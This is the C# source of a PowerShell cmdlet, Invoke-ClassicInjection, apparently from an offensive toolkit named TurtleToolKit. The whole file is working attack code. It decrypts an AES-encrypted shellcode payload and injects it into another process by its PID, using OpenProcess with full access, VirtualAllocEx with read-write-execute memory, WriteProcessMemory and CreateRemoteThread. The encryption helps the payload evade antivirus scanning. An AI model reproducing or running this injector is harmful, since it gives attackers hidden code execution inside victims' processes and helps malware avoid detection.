using System;
using System.Management.Automation;
using TurtleToolKitManaged;
using TurtleToolKitCrypt;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "ClassicInjection")] // <- seeting cmdlet name and verbs
    //[OutputType(typeof(ShellCodeEncryptedOutput))]       // <-- setting output type
    [Alias("INVCI")] //<- cmdlet alias
    public class InvokeClassicInjection : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("p")] public int pid { get; set; }
        [Parameter(Mandatory = true)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = true)] [Alias("s")] public byte[] shellCode { get; set; }
        [Parameter(Mandatory = true)] [Alias("ivk")] public byte[] initVector { get; set; }

        // class attributes
        Cryptor cryptObj;


        // Init cmdlet
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
            cryptObj = new Cryptor(decryptKey, initVector);
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // perform decryption and injection
            if (!ExecuteClassicInjection(cryptObj, shellCode, pid))
            {
                WriteWarning("Failed to execute classic injection");
                return;
            }
            WriteVerbose("Successfully Executed Classic Injection");
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        private bool ExecuteClassicInjection(Cryptor crypt, byte[] payloadBytes, int processId)
        {
            // to do add error better error checking
            try
            {
                var decryptedBytes = crypt.DecryptBytes(payloadBytes);
                if (decryptedBytes == null)
                {
                    Console.WriteLine("Failed to decrypt bytes");
                    return false;
                }
                int payloadSize = decryptedBytes.Length;
                IntPtr outSize;
                IntPtr hProcess = Win32.OpenProcess(0x001F0FFF, false, processId);
                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadSize, 0x3000, 0x40);
                if (!Win32.WriteProcessMemory(hProcess, addr, decryptedBytes, payloadSize, out outSize))
                {
                    Console.WriteLine("failed to write process memory");
                    return false;
                }
                IntPtr hThread = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                return true;
            }
            catch
            {
                Console.WriteLine("Failed to execute classic injection");
                return false;
            }
        }
    }
}
